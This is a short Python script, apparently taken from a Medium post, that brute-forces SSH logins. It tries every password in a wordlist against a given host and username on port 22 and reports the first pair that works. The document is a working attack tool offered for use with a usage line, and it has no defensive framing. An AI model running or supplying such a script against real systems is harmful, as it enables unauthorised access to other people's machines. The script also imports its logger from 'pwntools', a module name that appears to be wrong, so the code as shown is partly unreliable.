# Medium.com

import paramiko
import sys
import os
from pwntools import log

def ssh_bruteforce(host, username, password_file):
    if not os.path.exists(password_file):
        print(f"[!] Password file not found: {password_file}")
        sys.exit(1)
    with open(password_file, 'r') as pf:
        for password in pf:
            pwd = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=22, username=username, password=pwd, timeout=5)
            except paramiko.AuthenticationException:
                log.info(f"Wrong: {username}:{pwd}")
            except Exception as e:
                log.error(f"Error: {e}")
            else:
                log.success(f"Success - {username}:{pwd}")
                ssh.close()
                return
    log.failure("Brute-force finished, no valid credentials found.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <host> <username> <password_file>")
        sys.exit(1)
    ssh_bruteforce(sys.argv[1], sys.argv[2], sys.argv[3])
